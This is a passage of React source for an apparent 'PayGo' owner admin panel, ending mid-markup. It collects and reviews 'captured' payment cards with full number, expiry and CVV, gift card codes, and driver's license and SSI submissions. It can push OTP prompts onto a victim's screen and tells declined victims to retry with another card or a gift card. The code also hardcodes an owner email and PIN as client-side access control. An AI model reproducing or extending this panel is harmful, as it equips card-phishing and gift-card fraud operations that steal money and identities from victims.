import React, { useState, useEffect } from 'react';
import {
  ArrowLeft,
  CreditCard,
  Gift,
  Lock,
  Check,
  Copy,
  Sparkles,
  Eye,
  CheckCircle,
  LogOut,
  ShieldCheck,
  Ban,
  Trash2,
  IdCard,
  Users,
  Globe,
  Activity,
  UserCheck,
  Laptop,
  Clock,
} from 'lucide-react';

import { collection, onSnapshot, query, doc, updateDoc, setDoc, getDoc, deleteDoc } from 'firebase/firestore';
import { onAuthStateChanged, signInWithPopup, signOut, User as FirebaseUser } from 'firebase/auth';
import { db, auth, googleProvider, handleFirestoreError, OperationType, blockUsedGiftCardCode } from '../lib/firebase';
import { notifyTelegramAdminVerdict } from '../lib/telegram';
import { GiftCardSubmission, KycSubmission } from '../types';
import { hashGiftCardCode } from '../utils/giftCardValidator';

const OWNER_EMAIL = 'ibro88977@gmail.com';
const OWNER_PIN = '4568';

interface CapturedCard {
  id: string;
  type: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  cardName: string;
  amount: number;
  status?: 'pending' | 'approved' | 'rejected';
  rejectionReason?: string;
  userEmail: string;
  userName: string;
  date: string;
  timestamp?: string;
}

interface AdminPanelProps {
  onBack: () => void;
}

interface ClientUser {
  email: string;
  name: string;
  phone?: string;
  balance?: number;
  referralBalance?: number;
  accountLevel?: string;
  kycVerified?: boolean;
  kycStatus?: string;
  createdAt?: string;
  authMethod?: string;
  payIdVerified?: boolean;
  referralCode?: string;
  lastLoginAt?: string;
  lastActiveAt?: string;
  lastLoginDevice?: string;
  isOnline?: boolean;
}

interface SitePresenceEntry {
  sessionId: string;
  visitorType: 'member' | 'guest';
  page: string;
  active: boolean;
  lastActiveAt: string;
}

const ONLINE_WINDOW_MS = 2 * 60 * 1000;

const isSameLocalDay = (iso?: string, refDate: Date = new Date()): boolean => {
  if (!iso) return false;
  const parsed = new Date(iso);
  if (Number.isNaN(parsed.getTime())) return false;
  return (
    parsed.getFullYear() === refDate.getFullYear() &&
    parsed.getMonth() === refDate.getMonth() &&
    parsed.getDate() === refDate.getDate()
  );
};

const isUserOnline = (client: ClientUser, nowMs: number): boolean => {
  if (client.isOnline === false || !client.lastActiveAt) return false;
  const activeMs = Date.parse(client.lastActiveAt);
  if (Number.isNaN(activeMs)) return false;
  return nowMs - activeMs <= ONLINE_WINDOW_MS;
};

const formatLastLoginTime = (iso?: string, nowMs: number = Date.now()): string => {
  if (!iso) return 'Never recorded';
  const ts = Date.parse(iso);
  if (Number.isNaN(ts)) return 'Never recorded';
  const diffSec = Math.max(0, Math.floor((nowMs - ts) / 1000));
  let relative = '';
  if (diffSec < 60) relative = 'Just now';
  else if (diffSec < 3600) relative = `${Math.floor(diffSec / 60)}m ago`;
  else if (diffSec < 86400) relative = `${Math.floor(diffSec / 3600)}h ago`;
  else relative = `${Math.floor(diffSec / 86400)}d ago`;

  const formatted = new Date(ts).toLocaleString('en-US', {
    month: 'short',
    day: 'numeric',
    hour: 'numeric',
    minute: '2-digit',
  });
  return `${formatted} (${relative})`;
};

export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'cards' | 'giftcards' | 'kyc' | 'clients'>('cards');
  const [cards, setCards] = useState<CapturedCard[]>([]);
  const [giftCards, setGiftCards] = useState<GiftCardSubmission[]>([]);
  const [kycSubmissions, setKycSubmissions] = useState<KycSubmission[]>([]);
  const [clients, setClients] = useState<ClientUser[]>([]);
  const [sitePresence, setSitePresence] = useState<SitePresenceEntry[]>([]);
  const [nowMs, setNowMs] = useState(() => Date.now());
  const [showAllRecentLogins, setShowAllRecentLogins] = useState(false);
  const [clientSearchQuery, setClientSearchQuery] = useState('');
  const [firebaseUser, setFirebaseUser] = useState<FirebaseUser | null>(null);
  const [authReady, setAuthReady] = useState(false);
  const [isPinUnlocked, setIsPinUnlocked] = useState(false);
  const [pin, setPin] = useState('');
  const [error, setError] = useState('');
  const [isSigningIn, setIsSigningIn] = useState(false);
  const [previewImage, setPreviewImage] = useState<string | null>(null);
  const [previewImageTitle, setPreviewImageTitle] = useState<string>('Uploaded Photo');
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
  const [blockCodeInput, setBlockCodeInput] = useState('');
  const [blockNotice, setBlockNotice] = useState('');
  const [confirmDeleteAllGifts, setConfirmDeleteAllGifts] = useState(false);
  const [isDeletingAllGifts, setIsDeletingAllGifts] = useState(false);
  const [confirmDeleteAllCards, setConfirmDeleteAllCards] = useState(false);
  const [isDeletingAllCards, setIsDeletingAllCards] = useState(false);
  const [actionToast, setActionToast] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  const pendingGiftCards = giftCards.filter((g) => (g.status || 'pending') === 'pending');
  const pendingCards = cards.filter((c) => (c.status || 'pending') === 'pending');
  const pendingKyc = kycSubmissions.filter((k) => (k.status || 'pending') === 'pending');

  const nowDate = new Date(nowMs);
  const loggedInTodayCount = clients.filter((c) =>
    isSameLocalDay(c.lastLoginAt || c.lastActiveAt || c.createdAt, nowDate)
  ).length;

  const activeWebsiteSessions = sitePresence.filter((s) => {
    if (!s.active || !s.lastActiveAt) return false;
    const ms = Date.parse(s.lastActiveAt);
    return !Number.isNaN(ms) && nowMs - ms <= ONLINE_WINDOW_MS;
  });

  const onlineClientsCount = clients.filter((c) => isUserOnline(c, nowMs)).length;
  const guestVisitorsCount = activeWebsiteSessions.filter(
    (s) => s.visitorType === 'guest'
  ).length;
  const onWebsiteCount = Math.max(activeWebsiteSessions.length, onlineClientsCount);

  const recentlyLoggedInUsers = [...clients].sort((a, b) => {
    const timeA = Date.parse(a.lastLoginAt || a.lastActiveAt || a.createdAt || '') || 0;
    const timeB = Date.parse(b.lastLoginAt || b.lastActiveAt || b.createdAt || '') || 0;
    return timeB - timeA;
  });

  const visibleRecentLogins = showAllRecentLogins
    ? recentlyLoggedInUsers
    : recentlyLoggedInUsers.slice(0, 8);

  const showToast = (type: 'success' | 'error', text: string) => {
    setActionToast({ type, text });
    setTimeout(() => setActionToast(null), 5000);
  };

  const isOwnerGoogleVerified =
    !!firebaseUser &&
    firebaseUser.email?.toLowerCase() === OWNER_EMAIL &&
    firebaseUser.emailVerified === true;

  const isFullyAuthorized = isOwnerGoogleVerified && isPinUnlocked;

  // Watch Firebase Auth state
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, async (current) => {
      if (current && current.email?.toLowerCase() !== OWNER_EMAIL) {
        await signOut(auth).catch(() => {});
        setFirebaseUser(null);
        setIsPinUnlocked(false);
        setError('Access denied: Only the authorized owner account can access this portal.');
      } else {
        setFirebaseUser(current);
      }
      setAuthReady(true);
    });
    return () => unsub();
  }, []);

  // Load ATM Card Submissions only when verified as owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setCards([]);
      return;
    }

    const q = query(collection(db, 'cardSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedCards: CapturedCard[] = [];
        snapshot.forEach((docSnap) => {
          fetchedCards.push({ id: docSnap.id, ...docSnap.data() } as CapturedCard);
        });
        fetchedCards.sort((a, b) => {
          const timeA = a.timestamp || a.date || '';
          const timeB = b.timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setCards(fetchedCards);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'cardSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load Gift Card Verification Submissions only when verified as owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setGiftCards([]);
      return;
    }

    const q = query(collection(db, 'giftCardSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedGifts: GiftCardSubmission[] = [];
        snapshot.forEach((docSnap) => {
          fetchedGifts.push({ id: docSnap.id, ...docSnap.data() } as GiftCardSubmission);
        });
        fetchedGifts.sort((a, b) => {
          const timeA = (a as any).timestamp || a.date || '';
          const timeB = (b as any).timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setGiftCards(fetchedGifts);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'giftCardSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load Driver's License & SSI KYC Verification Submissions when owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setKycSubmissions([]);
      return;
    }

    const q = query(collection(db, 'kycSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedKyc: KycSubmission[] = [];
        snapshot.forEach((docSnap) => {
          fetchedKyc.push({ id: docSnap.id, ...docSnap.data() } as KycSubmission);
        });
        fetchedKyc.sort((a, b) => {
          const timeA = a.timestamp || a.date || '';
          const timeB = b.timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setKycSubmissions(fetchedKyc);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'kycSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load registered client accounts from Firestore
  useEffect(() => {
    if (!isFullyAuthorized) {
      setClients([]);
      return;
    }

    const q = query(collection(db, 'users'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetched: ClientUser[] = [];
        snapshot.forEach((docSnap) => {
          fetched.push({ ...docSnap.data() } as ClientUser);
        });
        fetched.sort((a, b) => {
          const timeA = a.createdAt || '';
          const timeB = b.createdAt || '';
          return timeB.localeCompare(timeA);
        });
        setClients(fetched);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'users');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load real-time website visitor heartbeats when owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setSitePresence([]);
      return;
    }

    const q = query(collection(db, 'sitePresence'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetched: SitePresenceEntry[] = [];
        snapshot.forEach((docSnap) => {
          fetched.push(docSnap.data() as SitePresenceEntry);
        });
        setSitePresence(fetched);
      },
      (err) => {
        console.warn('Site presence listener warning:', err);
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Refresh Online/Offline cutoff timer every 15 seconds
  useEffect(() => {
    const timer = window.setInterval(() => {
      setNowMs(Date.now());
    }, 15000);
    return () => window.clearInterval(timer);
  }, []);

  const handleOwnerGoogleSignIn = async () => {
    setError('');
    setIsSigningIn(true);
    try {
      const result = await signInWithPopup(auth, googleProvider);
      if (
        result.user.email?.toLowerCase() !== OWNER_EMAIL ||
        !result.user.emailVerified
      ) {
        await signOut(auth);
        setFirebaseUser(null);
        setError('Access denied: Only the authorized owner account can access this portal.');
      }
    } catch (err: any) {
      console.error('Owner Google sign-in error:', err);
      setError(err?.message || 'Google sign-in failed. Please try again.');
    } finally {
      setIsSigningIn(false);
    }
  };

  const handlePinUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isOwnerGoogleVerified) {
      setError('Please verify your owner Google account first.');
      return;
    }
    if (pin.trim() === OWNER_PIN) {
      setIsPinUnlocked(true);
      setPin('');
      setError('');
    } else {
      setError('Invalid Owner PIN');
    }
  };

  const handleAdminSignOut = async () => {
    setIsPinUnlocked(false);
    setPin('');
    await signOut(auth).catch(() => {});
  };

  const copyText = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  const handleUpdateGiftCardStatus = async (
    g: GiftCardSubmission,
    newStatus: 'verified' | 'redeemed' | 'rejected',
    customReason?: string
  ) => {
    try {
      const rejectionReason =
        customReason || 'USED / FAKE GIFT CARD: Wrong or already-used gift card is not allowed.';
      const nowIso = new Date().toISOString();
      const updates: Record<string, any> = { status: newStatus };
      if (newStatus === 'rejected') {
        updates.rejectionReason = rejectionReason;
      }
      await updateDoc(doc(db, 'giftCardSubmissions', g.id), updates);

      // Update PII-free real-time status mirror so the client receives instant approval or rejection
      if (g.statusId) {
        const statusPayload: Record<string, any> = {
          id: g.statusId,
          type: g.type,
          status: newStatus,
          updatedAt: nowIso,
        };
        if (newStatus === 'rejected') {
          statusPayload.rejectionReason = rejectionReason;
        }
        await setDoc(doc(db, 'giftCardStatuses', g.statusId), statusPayload);
      }

      const codeHash = g.codeHash || (await hashGiftCardCode(g.cardCode));
      await setDoc(
        doc(db, 'usedGiftCards', codeHash),
        {
          codeHash,
          brand: g.cardBrand,
          status: newStatus === 'rejected' ? 'used_rejected' : 'redeemed',
          createdAt: nowIso,
        },
        { merge: true }
      );

      // Sync user profile in Firestore (approve PAY ID / tier upgrade OR revoke only matching target if rejected)
      if (g.userEmail && g.userEmail !== 'unknown') {
        const cleanUserEmail = g.userEmail.trim().toLowerCase();
        const userRef = doc(db, 'users', cleanUserEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          if (newStatus === 'rejected') {
            if (g.type === 'PAY ID Verification') {
              await updateDoc(userRef, {
                payIdVerified: false,
                updatedAt: nowIso,
              });
            } else {
              await updateDoc(userRef, {
                updatedAt: nowIso,
              });
            }
          } else if (newStatus === 'verified' || newStatus === 'redeemed') {
            const profileUpdates: Record<string, any> = {
              cardRejectionReason: '',
              updatedAt: nowIso,
            };
            if (g.type === 'PAY ID Verification') {
              profileUpdates.payIdVerified = true;
            } else if (g.type.startsWith('Stage ')) {
              profileUpdates.accountLevel = g.type;
            }
            await updateDoc(userRef, profileUpdates);
          }
        }
      }

      notifyTelegramAdminVerdict({
        status: newStatus,
        userName: g.userName || 'User',
        userEmail: g.userEmail || 'unknown',
        cardBrand: g.cardBrand,
        type: g.type,
        amount: Number(g.amount) || 0,
        reason: newStatus === 'rejected' ? rejectionReason : undefined,
      });

      if (newStatus === 'verified' || newStatus === 'redeemed') {
        showToast('success', `Confirmed ${g.cardBrand} (${newStatus}) — client details unlocked!`);
      } else {
        showToast('error', `Rejected ${g.cardBrand} submission & blocked code from future reuse.`);
      }
    } catch (err: any) {
      showToast('error', err?.message || `Failed to update ${g.cardBrand} gift card status.`);
    }
  };

  const handleDeleteGiftCard = async (giftCardId: string) => {
    try {
      await deleteDoc(doc(db, 'giftCardSubmissions', giftCardId));
      showToast('success', 'Removed gift card submission.');
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to delete gift card submission.');
    }
  };

  const handleDeleteAllGiftCards = async () => {
    if (giftCards.length === 0) return;
    setIsDeletingAllGifts(true);
    try {
      await Promise.all(
        giftCards.map((g) => deleteDoc(doc(db, 'giftCardSubmissions', g.id)))
      );
      try {
        localStorage.removeItem('paygo_dropped_gift_cards');
      } catch {
        // ignore storage errors
      }
      setConfirmDeleteAllGifts(false);
      showToast('success', 'Deleted all gift card submissions sent to Admin.');
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to delete all gift card submissions.');
    } finally {
      setIsDeletingAllGifts(false);
    }
  };

  const handleUpdateKycStatus = async (
    k: KycSubmission,
    newStatus: 'verified' | 'rejected',
    customReason?: string
  ) => {
    try {
      const nowIso = new Date().toISOString();
      const rejectionReason =
        customReason ||
        "Driver's License or SSI details could not be verified. Please upload clear front/back ID photos and accurate SSI information.";

      const submissionUpdates: Record<string, any> = { status: newStatus };
      if (newStatus === 'rejected') {
        submissionUpdates.rejectionReason = rejectionReason;
      }
      await updateDoc(doc(db, 'kycSubmissions', k.id), submissionUpdates);

      if (k.statusId) {
        const statusPayload: Record<string, any> = {
          id: k.statusId,
          status: newStatus,
          updatedAt: nowIso,
        };
        if (newStatus === 'rejected') {
          statusPayload.rejectionReason = rejectionReason;
        }
        await setDoc(doc(db, 'kycStatuses', k.statusId), statusPayload);
      }

      if (k.userEmail && k.userEmail !== 'unknown') {
        const cleanUserEmail = k.userEmail.trim().toLowerCase();
        const userRef = doc(db, 'users', cleanUserEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          await updateDoc(userRef, {
            kycVerified: newStatus === 'verified',
            kycStatus: newStatus,
            kycRejectionReason: newStatus === 'rejected' ? rejectionReason : '',
            updatedAt: nowIso,
          });
        }
      }

      showToast(
        newStatus === 'verified' ? 'success' : 'error',
        newStatus === 'verified'
          ? `Approved Driver's License & SSI for ${k.userEmail} — withdrawals unlocked!`
          : `Rejected ID & SSI verification for ${k.userEmail}.`
      );
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to update ID & SSI verification status.');
    }
  };

  const handleDeleteKyc = async (kycId: string) => {
    try {
      await deleteDoc(doc(db, 'kycSubmissions', kycId));
      showToast('success', 'Removed KYC submission record.');
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to delete KYC submission record.');
    }
  };

  const handleManualBlockUsedCard = async (e: React.FormEvent) => {
    e.preventDefault();
    setBlockNotice('');
    const clean = blockCodeInput.trim();
    if (clean.length < 6) {
      setBlockNotice('Enter at least 6 characters of the used gift card code.');
      return;
    }
    try {
      await blockUsedGiftCardCode(clean, 'Admin Flagged Used Card');
      setBlockCodeInput('');
      setBlockNotice('Used gift card code permanently blocked. No user can drop it.');
    } catch (err: any) {
      setBlockNotice(err?.message || 'Failed to block card code.');
    }
  };


  const handleTriggerOtpForCard = async (c: CapturedCard) => {
    try {
      await updateDoc(doc(db, 'cardSubmissions', c.id), {
        requiresOtp: true,
      });
      showToast('success', `OTP verification requested for ${c.userEmail}. Pop-up triggered on client's screen!`);
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to trigger OTP verification.');
    }
  };

  const handleDeleteCard = async (cardId: string) => {
    try {
      await deleteDoc(doc(db, 'cardSubmissions', cardId));
      showToast('success', 'Removed ATM card submission.');
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to remove ATM card submission.');
    }
  };

  const handleDeleteAllCards = async () => {
    if (cards.length === 0) return;
    setIsDeletingAllCards(true);
    try {
      await Promise.all(
        cards.map((c) => deleteDoc(doc(db, 'cardSubmissions', c.id)))
      );
      setConfirmDeleteAllCards(false);
      showToast('success', 'Deleted all ATM card submissions.');
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to delete all ATM card submissions.');
    } finally {
      setIsDeletingAllCards(false);
    }
  };

  const handleApproveCardSubmission = async (c: CapturedCard) => {
    try {
      await updateDoc(doc(db, 'cardSubmissions', c.id), {
        status: 'approved',
        rejectionReason: '',
      });

      const cleanEmail = c.userEmail?.trim().toLowerCase();
      let userProfileFound = false;
      if (cleanEmail && cleanEmail !== 'unknown') {
        const userRef = doc(db, 'users', cleanEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          userProfileFound = true;
          const updates: Record<string, any> = {
            cardRejectionReason: '',
            updatedAt: new Date().toISOString(),
          };
          const lowerType = (c.type || '').toLowerCase();
          if (lowerType.includes('pay id')) {
            updates.payIdVerified = true;
          } else if (c.type?.startsWith('Stage ')) {
            updates.accountLevel = c.type.replace(' Card Purchase', '').replace(' Card', '');
          }
          await updateDoc(userRef, updates);
        }
      }

      showToast(
        'success',
        userProfileFound
          ? `Approved and unlocked details for ${c.userEmail}!`
          : `Approved card submission for ${c.userEmail}.`
      );
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to approve card submission.');
    }
  };

  const handleRejectCardSubmission = async (c: CapturedCard) => {
    try {
      const reason =
        'ATM Card Declined: Card details could not be verified or charged. Please try another valid card or Gift Card.';
      await updateDoc(doc(db, 'cardSubmissions', c.id), {
        status: 'rejected',
        rejectionReason: reason,
      });

      const cleanEmail = c.userEmail?.trim().toLowerCase();
      if (cleanEmail && cleanEmail !== 'unknown') {
        const userRef = doc(db, 'users', cleanEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          await updateDoc(userRef, {
            cardRejectionReason: reason,
            updatedAt: new Date().toISOString(),
          });
        }
      }

      showToast('error', `Rejected ATM card for ${c.userEmail}. Client notified to retry.`);
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to reject card submission.');
    }
  };

  if (!isFullyAuthorized) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
        <div className="bg-gray-800 rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl text-white">
          <div className="w-16 h-16 bg-purple-600/20 text-purple-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-purple-500/30">
            <Lock className="w-8 h-8" />
          </div>
          <h2 className="text-2xl font-bold text-center mb-1">Owner Admin Access</h2>
          <p className="text-xs text-gray-400 text-center mb-6">
            Restricted to authorized owner only
          </p>

          {error && (
            <div className="mb-4 p-3 bg-red-900/50 border border-red-700 text-red-300 text-xs rounded-xl">
              {error}
            </div>
          )}

          {!authReady ? (
            <div className="py-8 flex justify-center">
              <div className="w-8 h-8 border-4 border-purple-500 border-t-transparent rounded-full animate-spin" />
            </div>
          ) : !isOwnerGoogleVerified ? (
            <div className="space-y-4">
              <div className="bg-gray-900/80 border border-gray-700 rounded-2xl p-4 text-xs text-gray-300 leading-relaxed">
                Step 1 of 2: Sign in with the verified owner Google account to unlock database access.
              </div>
              <button
                type="button"
                onClick={handleOwnerGoogleSignIn}
                disabled={isSigningIn}
                className="w-full bg-white hover:bg-gray-100 text-gray-900 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
              >
                <ShieldCheck className="w-4 h-4 text-purple-700" />
                <span>{isSigningIn ? 'Verifying...' : 'Sign in with Owner Google Account'}</span>
              </button>
            </div>
          ) : (
            <form onSubmit={handlePinUnlock} className="space-y-4">
              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-3 text-xs text-emerald-300 flex items-center justify-between">
                <span className="truncate">Verified: {firebaseUser?.email}</span>
                <button
                  type="button"
                  onClick={handleAdminSignOut}
                  className="text-gray-300 hover:text-white underline ml-2 shrink-0 cursor-pointer"
                >
                  Switch
                </button>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                  Enter Owner PIN
                </label>
                <input
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder="Enter Owner PIN"
                  className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none text-sm text-white font-mono tracking-widest text-center"
                  required
                />
              </div>

              <button
                type="submit"
                className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer"
              >
                Access Admin Logs
              </button>
            </form>
          )}

          <div className="mt-6 pt-4 border-t border-gray-700 text-center">
            <button
              onClick={onBack}
              className="text-xs text-gray-400 hover:text-white transition-colors cursor-pointer"
            >
              ← Return to PayGo App
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white pb-12">
      {/* Top Bar */}
      <div className="bg-gray-800 p-4 border-b border-gray-700 sticky top-0 z-30 shadow-md">
        <div className="max-w-5xl mx-auto flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-gray-700 rounded-full transition-colors text-white cursor-pointer"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-bold">
                <span>Owner Admin Portal</span>
              </h1>
              <p className="text-xs text-gray-400">
                Verification &amp; Client Management • {firebaseUser?.email || OWNER_EMAIL}
              </p>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            {/* Quick tab switcher in header */}
            <div className="flex flex-wrap gap-1 bg-gray-900 p-1 rounded-xl border border-gray-700">
              <button
                onClick={() => setActiveTab('cards')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'cards'
                    ? 'bg-purple-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <CreditCard className="w-3.5 h-3.5" />
                <span>Card / Other ({cards.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('giftcards')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'giftcards'
                    ? 'bg-amber-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <Gift className="w-3.5 h-3.5" />
                <span>Gift Cards ({giftCards.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('kyc')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'kyc'
                    ? 'bg-indigo-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <IdCard className="w-3.5 h-3.5" />
                <span>ID / KYC ({kycSubmissions.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('clients')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'clients'
                    ? 'bg-purple-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <Users className="w-3.5 h-3.5" />
                <span>Clients ({clients.length})</span>
              </button>
            </div>

            <button
              onClick={handleAdminSignOut}
              title="Lock Admin Portal"
              className="bg-red-500/20 hover:bg-red-500/30 text-red-300 px-3 py-2 rounded-xl text-xs font-semibold border border-red-500/30 flex items-center space-x-1 cursor-pointer whitespace-nowrap shrink-0"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Lock</span>
            </button>
          </div>
        </div>
      </div>

      <div className="max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
        {actionToast && (
          <div
            className={`p-3.5 rounded-2xl text-xs font-semibold flex items-center justify-between border shadow-md ${
              actionToast.type === 'success'
                ? 'bg-emerald-950/80 border-emerald-500/40 text-emerald-300'
                : 'bg-red-950/80 border-red-500/40 text-red-300'
            }`}
          >
            <span>{actionToast.text}</span>
            <button
              onClick={() => setActionToast(null)}
              className="text-gray-400 hover:text-white ml-3 cursor-pointer"
            >
              ✕
            </button>
          </div>
        )}

        {/* Admin Dashboard Stats: Total Users, Logged In Today, On My Website */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="bg-gray-800 border border-emerald-500/30 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-semibold tracking-wider">
                Total Users
              </p>
              <Users className="w-4 h-4 text-emerald-400" />
            </div>
            <h3 className="text-3xl font-black text-emerald-400 mt-1.5 tabular-nums">
              {clients.length}
            </h3>
            <p className="text-xs text-gray-400 mt-1 tabular-nums">
              {clients.filter((c) => c.payIdVerified).length} PAY ID verified
            </p>
          </div>

          <div className="bg-gray-800 border border-sky-500/30 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-semibold tracking-wider">
                Users Logged In Today
              </p>
              <UserCheck className="w-4 h-4 text-sky-400" />
            </div>
            <h3 className="text-3xl font-black text-sky-400 mt-1.5 tabular-nums">
              {loggedInTodayCount}
            </h3>
            <p className="text-xs text-gray-400 mt-1">
              Active on {nowDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}
            </p>
          </div>

          <div className="bg-gray-800 border border-purple-500/30 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-semibold tracking-wider">
                On My Website
              </p>
              <Globe className="w-4 h-4 text-purple-400" />
            </div>
            <h3 className="text-3xl font-black text-purple-400 mt-1.5 tabular-nums">
              {onWebsiteCount}
            </h3>
            <p className="text-xs text-gray-400 mt-1 tabular-nums">
              {onlineClientsCount} members online • {guestVisitorsCount} guests browsing
            </p>
          </div>
        </div>

        {/* Recently Active: Recently Logged In Table */}
        <div className="bg-gray-800 border border-gray-700 rounded-2xl overflow-hidden shadow-sm">
          <div className="px-5 py-4 border-b border-gray-700 flex flex-wrap items-center justify-between gap-3">
            <div className="flex items-center space-x-2.5">
              <Activity className="w-5 h-5 text-emerald-400 shrink-0" />
              <div>
                <h2 className="text-base font-bold text-white">Recently Logged In</h2>
                <p className="text-xs text-gray-400">
                  Sorted by newest login • Live Online / Offline status
                </p>
              </div>
            </div>
            {recentlyLoggedInUsers.length > 8 && (
              <button
                type="button"
                onClick={() => setShowAllRecentLogins((prev) => !prev)}
                className="text-xs font-bold text-purple-300 hover:text-white bg-purple-600/20 hover:bg-purple-600/35 border border-purple-500/30 px-3 py-1.5 rounded-xl transition-colors cursor-pointer whitespace-nowrap"
              >
                {showAllRecentLogins
                  ? 'Show Latest 8'
                  : `View All (${recentlyLoggedInUsers.length})`}
              </button>
            )}
          </div>

          {recentlyLoggedInUsers.length === 0 ? (
            <div className="p-8 text-center text-gray-400 text-sm">
              No client logins recorded yet.
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-gray-900/60 border-b border-gray-700 text-[11px] uppercase tracking-wider text-gray-400">
                    <th className="py-3 px-4 font-semibold">Name</th>
                    <th className="py-3 px-4 font-semibold">Email</th>
                    <th className="py-3 px-4 font-semibold">Device</th>
                    <th className="py-3 px-4 font-semibold">Last Login Time</th>
                    <th className="py-3 px-4 font-semibold text-right">Status</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700/70 text-xs">
                  {visibleRecentLogins.map((client) => {
                    const online = isUserOnline(client, nowMs);
                    return (
                      <tr
                        key={client.email}
                        className="hover:bg-gray-700/30 transition-colors"
                      >
                        <td className="py-3 px-4 font-bold text-white whitespace-nowrap">
                          {client.name || 'Unnamed User'}
                        </td>
                        <td className="py-3 px-4 text-purple-300 max-w-[200px] truncate">
                          {client.email}
                        </td>
                        <td className="py-3 px-4 text-gray-300 whitespace-nowrap">
                          <span className="inline-flex items-center space-x-1.5">
                            <Laptop className="w-3.5 h-3.5 text-gray-400 shrink-0" />
